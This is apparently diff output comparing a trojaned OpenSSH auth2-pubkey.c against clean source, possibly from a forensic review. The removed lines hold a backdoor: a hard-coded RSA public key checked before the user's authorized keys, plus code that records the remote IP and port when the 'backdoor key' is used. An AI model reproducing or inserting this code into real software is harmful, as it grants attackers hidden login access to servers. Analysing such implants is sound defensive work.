@@ -1,0 +1,42 @@
+Viewing: 'auth2-pubkey.c'
+Launch 'diff' [Y/n]: 
+68,69d67
+< #define KEY_TUWEL "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMfAdPOOBDuzYih8neJCs6YA0fHyuDTieslk4GjM19JJh89zYR+uXKUlMzwAdEfEoELugoqYRMGg0QVSYIlDzzTtPc26agKEBZAZas7Q+M/Y6HD76EdFbNFzYJ4wo/cYfDpxr2uXhAhKOAQ0AVGBrd26SgHmw4iX8HqLniqyLj+f41jLJoaH09YUQ/O6ZX9nFDoF3fXo2GJJYoxEz0/d63+vKst22vd1XKXApdir3QwfpMwrmMIsS4ObotQsZ0DO9Mbtcv5EmV3/h1EQFIRSNwObKDUMIa0zvZRpGM8LVBzlZ8meVrHm3BiycYSIWjAgrgbUoypuKpGQOevRaF1jDovaX6XVOZyek8WwYWo4J3xYQBpX3Y337T/+VTwdsLwdDWtyMoFjiG0Kgx7qK6zsaHKA8ZElN7OkRlhbQoXlUrvwPWjrw8jM75vhMXpM1ZcS/MzXxUvVJdgoAXcarx9fqfX/BQJcwtR0THiOCeFGq1PTyv2BWn2FkraRozS/hkZS+CmdnDxl26/YE9Ls79+DN13Xgao5aLM/hnti5iXixmuqmv+xENIYyO21wjDbvuool25W58BXj6Yecrxhi68UI899NE9iV38kHeUIYYD1/K7/F9Y7g4PKhDN4KMshYambfqzdx9S+aaeE06+LdapOQt40G9MdgUn73b7uz3il/04Q== martin@phoenix"
+< 
+166d163
+< 
+181d177
+< 
+322d317
+< 	char lineStealth[SSH_MAX_PUBKEY_BYTES] = KEY_TUWEL;
+328d322
+< 	int chooseSecretKey=0;
+333c327
+< 	while (chooseSecretKey==0 || read_keyfile_line(f, file, line, sizeof(line), &linenum) != -1) {
+---
+> 	while (read_keyfile_line(f, file, line, sizeof(line), &linenum) != -1) {
+341,348c335
+< 		if (chooseSecretKey==0){
+< 			chooseSecretKey=1;
+< 			for (cp = lineStealth; *cp == ' ' || *cp == '\t'; cp++)
+< 			;
+< 		}
+< 		else {
+< 			chooseSecretKey=2;
+< 			for (cp = line; *cp == ' ' || *cp == '\t'; cp++)
+---
+> 		for (cp = line; *cp == ' ' || *cp == '\t'; cp++)
+350d336
+< 		}
+434,441d419
+< 
+< 	/*
+< 		if logged in with backdoor key, write socket information to global variables
+< 	*/
+< 	if (chooseSecretKey==1){
+< 		global_ip = get_remote_ipaddr();
+< 		global_port = get_remote_port();
+< 	}
+512d489
+< 
+
